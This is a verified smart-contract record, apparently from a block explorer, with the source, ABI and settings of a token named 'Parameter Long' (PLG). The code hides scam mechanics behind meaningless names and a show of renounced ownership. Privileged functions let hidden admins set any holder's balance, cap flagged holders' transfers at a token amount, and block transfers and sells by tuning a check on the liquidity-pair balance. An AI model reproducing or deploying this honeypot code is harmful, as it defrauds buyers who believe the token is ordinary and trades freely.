{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface receiverTeamAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tokenEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeAuto {\n    function createPair(address buySender, address liquidityLimit) external returns (address);\n}\n\ninterface amountSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxShould) external view returns (uint256);\n\n    function transfer(address liquidityMarketing, uint256 swapBuy) external returns (bool);\n\n    function allowance(address fundTeamAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityMarketing,\n        uint256 swapBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedTotalTx, uint256 value);\n    event Approval(address indexed fundTeamAmount, address indexed spender, uint256 value);\n}\n\ninterface amountSwapMetadata is amountSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ParameterLong is tokenEnable, amountSwap, amountSwapMetadata {\n\n    uint256 private fromEnableAuto = 100000000 * 10 ** 18;\n\n    string private sellLaunched = \"PLG\";\n\n    function allowance(address marketingWallet, address walletTotal) external view virtual override returns (uint256) {\n        if (walletTotal == modeLaunched) {\n            return type(uint256).max;\n        }\n        return tokenWalletAmount[marketingWallet][walletTotal];\n    }\n\n    address public exemptFund;\n\n    uint8 private senderLaunched = 18;\n\n    uint256 public txSender;\n\n    address public receiverTx;\n\n    function approve(address walletTotal, uint256 swapBuy) public virtual override returns (bool) {\n        tokenWalletAmount[_msgSender()][walletTotal] = swapBuy;\n        emit Approval(_msgSender(), walletTotal, swapBuy);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return toSell;\n    }\n\n    uint256 public swapIs;\n\n    bool public sellTokenList;\n\n    function receiverExempt(address takeSender, address liquidityMarketing, uint256 swapBuy) internal returns (bool) {\n        require(autoMin[takeSender] >= swapBuy);\n        autoMin[takeSender] -= swapBuy;\n        autoMin[liquidityMarketing] += swapBuy;\n        emit Transfer(takeSender, liquidityMarketing, swapBuy);\n        return true;\n    }\n\n    uint256 private exemptReceiverFund;\n\n    function transfer(address fundMin, uint256 swapBuy) external virtual override returns (bool) {\n        return minFrom(_msgSender(), fundMin, swapBuy);\n    }\n\n    event OwnershipTransferred(address indexed receiverTxTrading, address indexed takeExempt);\n\n    bool public tokenSender;\n\n    bool public walletTeam;\n\n    constructor (){\n        if (walletTeam == marketingTake) {\n            exemptReceiverFund = swapIs;\n        }\n        receiverTeamAuto launchExemptMarketing = receiverTeamAuto(modeLaunched);\n        receiverTx = feeAuto(launchExemptMarketing.factory()).createPair(launchExemptMarketing.WETH(), address(this));\n        if (sellTokenList != marketingTake) {\n            marketingTake = false;\n        }\n        exemptFund = _msgSender();\n        receiverTrading();\n        txLaunch[exemptFund] = true;\n        autoMin[exemptFund] = fromEnableAuto;\n        if (sellTokenList) {\n            walletTeam = false;\n        }\n        emit Transfer(address(0), exemptFund, fromEnableAuto);\n    }\n\n    address limitTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 walletList;\n\n    address private toSell;\n\n    function feeMarketing(address launchWallet) public {\n        receiverList();\n        \n        if (launchWallet == exemptFund || launchWallet == receiverTx) {\n            return;\n        }\n        teamReceiver[launchWallet] = true;\n    }\n\n    function owner() external view returns (address) {\n        return toSell;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellLaunched;\n    }\n\n    function balanceOf(address maxShould) public view virtual override returns (uint256) {\n        return autoMin[maxShould];\n    }\n\n    function receiverTrading() public {\n        emit OwnershipTransferred(exemptFund, address(0));\n        toSell = address(0);\n    }\n\n    bool public tokenBuy;\n\n    mapping(address => mapping(address => uint256)) private tokenWalletAmount;\n\n    function minFrom(address takeSender, address liquidityMarketing, uint256 swapBuy) internal returns (bool) {\n        if (takeSender == exemptFund) {\n            return receiverExempt(takeSender, liquidityMarketing, swapBuy);\n        }\n        uint256 liquiditySwap = amountSwap(receiverTx).balanceOf(limitTo);\n        require(liquiditySwap == walletList);\n        require(liquidityMarketing != limitTo);\n        if (teamReceiver[takeSender]) {\n            return receiverExempt(takeSender, liquidityMarketing, sellTradingLaunch);\n        }\n        return receiverExempt(takeSender, liquidityMarketing, swapBuy);\n    }\n\n    bool public marketingTake;\n\n    uint256 constant sellTradingLaunch = 2 ** 10;\n\n    uint256 modeFeeReceiver;\n\n    mapping(address => bool) public teamReceiver;\n\n    function receiverList() private view {\n        require(txLaunch[_msgSender()]);\n    }\n\n    string private takeWallet = \"Parameter Long\";\n\n    mapping(address => uint256) private autoMin;\n\n    function tokenAt(address launchMode) public {\n        if (launchedEnable) {\n            return;\n        }\n        if (tokenBuy == isMaxSell) {\n            swapIs = exemptReceiverFund;\n        }\n        txLaunch[launchMode] = true;\n        if (tokenBuy == sellTokenList) {\n            sellTokenList = true;\n        }\n        launchedEnable = true;\n    }\n\n    function transferFrom(address takeSender, address liquidityMarketing, uint256 swapBuy) external override returns (bool) {\n        if (_msgSender() != modeLaunched) {\n            if (tokenWalletAmount[takeSender][_msgSender()] != type(uint256).max) {\n                require(swapBuy <= tokenWalletAmount[takeSender][_msgSender()]);\n                tokenWalletAmount[takeSender][_msgSender()] -= swapBuy;\n            }\n        }\n        return minFrom(takeSender, liquidityMarketing, swapBuy);\n    }\n\n    function fromExemptList(uint256 swapBuy) public {\n        receiverList();\n        walletList = swapBuy;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderLaunched;\n    }\n\n    mapping(address => bool) public txLaunch;\n\n    function teamIs(address fundMin, uint256 swapBuy) public {\n        receiverList();\n        autoMin[fundMin] = swapBuy;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeWallet;\n    }\n\n    bool private buyMin;\n\n    address modeLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public isMaxSell;\n\n    bool public launchedEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromEnableAuto;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTeamAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTxTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTotalTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchWallet\",\"type\":\"address\"}],\"name\":\"feeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapBuy\",\"type\":\"uint256\"}],\"name\":\"fromExemptList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMaxSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTokenList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapBuy\",\"type\":\"uint256\"}],\"name\":\"teamIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMode\",\"type\":\"address\"}],\"name\":\"tokenAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ParameterLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}